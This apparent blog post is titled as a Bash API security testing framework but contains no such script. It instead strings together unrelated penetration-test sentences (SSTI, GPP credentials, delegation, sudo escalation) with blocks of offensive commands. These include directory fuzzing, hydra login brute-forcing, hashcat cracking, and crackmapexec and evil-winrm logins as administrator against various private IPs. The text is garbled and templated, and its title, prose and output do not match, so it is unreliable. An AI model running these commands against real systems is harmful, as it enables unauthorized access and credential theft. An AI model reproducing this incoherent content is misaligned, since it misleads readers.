---
TitleSEO: "API Security Testing Framework in Bash | ZureFX"
TitlePost: "API Security Testing Framework — Bash"
Author: "ZureFX"
Description: "A Bash script for api security testing framework. Built for security research and automation."
Keywords: "go, script, bash, rust, scanner, tool"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-862.html"
URL_IMAGES: ""
Date: "2025-12-21"
Tags: "Go, Script, Bash, Rust, Scanner, Tool"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-862"
Permalink: "/scripting/script-api-security-testing-framework-862.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `ldapsearch`
- `gobuster`
- `msfvenom`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.106.191.60/FUZZ
```

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.103.217.165/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p3306,464,21 10.60.69.77 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.34.125 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.106.94.20 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.89.239.113 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p25,22,993 10.42.149.230 -oN scan.txt
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.121.172.103/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.33.71 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.43.82.86 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.82.208.76/FUZZ
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 27.58s
```
